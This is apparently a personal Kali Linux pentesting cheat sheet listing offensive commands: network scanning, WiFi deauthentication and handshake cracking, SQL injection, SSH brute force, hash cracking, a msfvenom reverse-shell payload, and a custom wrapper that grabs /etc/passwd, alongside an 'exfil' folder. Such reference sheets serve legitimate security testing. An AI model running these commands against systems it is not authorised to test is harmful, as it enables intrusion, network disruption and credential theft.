# KALI PENTESTER QUICK REFERENCE

## Essential Commands

### Network Scanning
```bash
nmap -sn 192.168.1.0/24           # Discover hosts
nmap -sV -p- 192.168.1.50          # Full port scan
nmap -sV -sC 192.168.1.50          # Default scripts
nmap -O 192.168.1.50               # OS detection
```

### WiFi
```bash
airmon-ng start wlan0               # Monitor mode
airodump-ng wlan0mon                # Scan APs
aireplay-ng -0 1 -a MAC wlan0mon   # Deauth
aircrack-ng -w wordlist cap.cap     # Crack
```

### Web
```bash
nikto -h target.com                # Web scan
sqlmap -u "target.com/?id=1"       # SQLi
gobuster dir -u target.com         # Directory
curl -v target.com                # Request
```

### Password
```bash
john hash.txt                      # Crack hash
hashcat -m 0 hash.txt wordlist     # GPU crack
hydra -L users.txt -P pass.txt ssh://target
```

### Exploitation
```bash
msfconsole                        # Metasploit
msfvenom -p linux/x64/shell LHOST=IP LPORT=4444 -f elf > shell.elf
searchsploit nginx               # Find exploits
```

## GO Command
```bash
go quick 192.168.1.1              # Quick scan
go full target.com                 # Full pentest
go wifi                           # WiFi audit
go grab 192.168.1.50 /etc/passwd  # Grab file
go ai-pentest target.com          # AI pentest
go status                         # Check systems
go help                           # All commands
```

## File Locations
| Type | Location |
|------|----------|
| Tools | `/opt/tools/` |
| Scripts | `~/scripts/` |
| Reports | `~/pentest-reports/` |
| Cracked | `~/cracked/` |
| Exfil | `~/exfil/` |

## Network
| Machine | IP |
|---------|-----|
| Laptop | 192.168.1.100 |
| Desktop | 192.168.1.200 |

## SSH
```bash
ssh root@192.168.1.200           # Desktop
ssh -p 2222 root@192.168.1.200   # Hardened port
```
